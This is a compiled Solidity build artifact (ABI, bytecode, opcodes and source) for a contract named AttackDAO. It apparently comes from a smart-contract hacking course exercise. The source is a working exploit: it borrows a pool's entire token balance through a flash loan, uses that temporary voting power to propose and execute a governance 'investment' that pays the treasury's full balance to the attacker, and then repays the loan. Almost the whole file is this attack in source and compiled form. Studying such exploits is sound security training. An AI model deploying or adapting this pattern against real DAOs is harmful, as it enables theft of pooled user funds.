{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_treasury",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_governance",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_pool",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "borrowAmount",
          "type": "uint256"
        }
      ],
      "name": "callBack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "61012060405234801561001157600080fd5b506040516105f43803806105f483398101604081905261003091610073565b6001600160a01b0393841660805291831660a052821660c0521660e05233610100526100c7565b80516001600160a01b038116811461006e57600080fd5b919050565b6000806000806080858703121561008957600080fd5b61009285610057565b93506100a060208601610057565b92506100ae60408601610057565b91506100bc60608601610057565b905092959194509250565b60805160a05160c05160e051610100516104c961012b6000396000818160d701526102da01526000818160630152818161022c015261034a01526000818161012b01526101b30152600060ff01526000818161025b015261037b01526104c96000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806304d314801461003b5780639e5faafc14610050575b600080fd5b61004e610049366004610438565b610058565b005b61004e6102cf565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146100c05760405162461bcd60e51b81526020600482015260086024820152671b9bdd081c1bdbdb60c21b60448201526064015b60405180910390fd5b60405163159d498b60e31b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660048301527f000000000000000000000000000000000000000000000000000000000000000081163160248301526000917f00000000000000000000000000000000000000000000000000000000000000009091169063acea4c58906044016020604051808303816000875af1158015610176573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061019a9190610451565b604051631a7651e760e21b8152600481018290529091507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906369d9479c90602401600060405180830381600087803b1580156101ff57600080fd5b505af1158015610213573d6000803e3d6000fd5b505060405163a9059cbb60e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830152602482018690527f000000000000000000000000000000000000000000000000000000000000000016925063a9059cbb91506044016020604051808303816000875af11580156102a6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102ca919061046a565b505050565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146103335760405162461bcd60e51b81526020600482015260096024820152683737ba1037bbb732b960b91b60448201526064016100b7565b6040516370a0823160e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830181905291639ab603b9917f000000000000000000000000000000000000000000000000000000000000000016906370a0823190602401602060405180830381865afa1580156103c2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103e69190610451565b6040518263ffffffff1660e01b815260040161040491815260200190565b600060405180830381600087803b15801561041e57600080fd5b505af1158015610432573d6000803e3d6000fd5b50505050565b60006020828403121561044a57600080fd5b5035919050565b60006020828403121561046357600080fd5b5051919050565b60006020828403121561047c57600080fd5b8151801515811461048c57600080fd5b939250505056fea26469706673582212205ac4fa92aaaffc94223f18faf8ab6cf94fbc08bf3c5331ee8a8061b9639f01d964736f6c63430008130033",
  "bytecodeSha1": "02e09db11db6c2722f4c076747804c808df254be",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "AttackDAO",
  "language": "Solidity",
  "natspec": {
    "author": "JohnnyTime (https://smartcontractshacking.com)",
    "kind": "dev",
    "methods": {},
    "title": "AttackDAO",
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4D31480 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x50 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x49 CALLDATASIZE PUSH1 0x4 PUSH2 0x438 JUMP JUMPDEST PUSH2 0x58 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4E PUSH2 0x2CF JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0xC0 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x8 PUSH1 0x24 DUP3 ADD MSTORE PUSH8 0x1B9BDD081C1BDBDB PUSH1 0xC2 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x159D498B PUSH1 0xE3 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH32 0x0 DUP2 AND BALANCE PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x0 SWAP2 PUSH32 0x0 SWAP1 SWAP2 AND SWAP1 PUSH4 0xACEA4C58 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x176 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x19A SWAP2 SWAP1 PUSH2 0x451 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x1A7651E7 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP3 SWAP1 MSTORE SWAP1 SWAP2 POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x69D9479C SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1FF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x213 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP7 SWAP1 MSTORE PUSH32 0x0 AND SWAP3 POP PUSH4 0xA9059CBB SWAP2 POP PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2CA SWAP2 SWAP1 PUSH2 0x46A JUMP JUMPDEST POP POP POP JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x333 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x9 PUSH1 0x24 DUP3 ADD MSTORE PUSH9 0x3737BA1037BBB732B9 PUSH1 0xB9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0xB7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD DUP2 SWAP1 MSTORE SWAP2 PUSH4 0x9AB603B9 SWAP2 PUSH32 0x0 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x3C2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x3E6 SWAP2 SWAP1 PUSH2 0x451 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x404 SWAP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x41E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x432 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x44A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x463 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x47C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x48C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GAS 0xC4 STATICCALL SWAP3 0xAA 0xAF 0xFC SWAP5 0x22 EXTCODEHASH XOR STATICCALL 0xF8 0xAB PUSH13 0xF94FBC08BF3C5331EE8A8061B9 PUSH4 0x9F01D964 PUSH20 0x6F6C634300081300330000000000000000000000 ",
  "sha1": "2eedb52882760c963a7815d04455dea466113ea8",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface IPool {\n    function flashLoan(uint256 borrowAmount) external;\n}\n\ninterface IGovernance {\n    function suggestInvestment(address _startup, uint256 _amount) external returns (uint256);\n    function executeInvestment(uint256 investmentId) external;\n}\n\n/**\n * @title AttackDAO\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\ncontract AttackDAO {\n\n    address immutable token;\n    address immutable treasury;\n    address immutable governance;\n    address immutable pool;\n    address immutable  owner;\n\n    constructor(address _token, address _treasury, address _governance, address _pool) {\n        token = _token;\n        treasury = _treasury;\n        governance = _governance;\n        pool = _pool;\n        owner = msg.sender;\n    }\n\n    function attack() external {\n        require(msg.sender == owner, \"not owner\");\n        IPool(pool).flashLoan(IERC20(token).balanceOf(pool));\n    }\n\n    function callBack(uint borrowAmount) external {\n        require(msg.sender == pool, \"not pool\");\n\n        uint256 investmentId = IGovernance(governance).suggestInvestment(owner, treasury.balance);\n        IGovernance(governance).executeInvestment(investmentId);\n\n        IERC20(token).transfer(pool, borrowAmount);\n    }\n\n}",
  "sourcePath": "contracts/dao-attack-3/AttackDAO.sol",
  "type": "contract"
}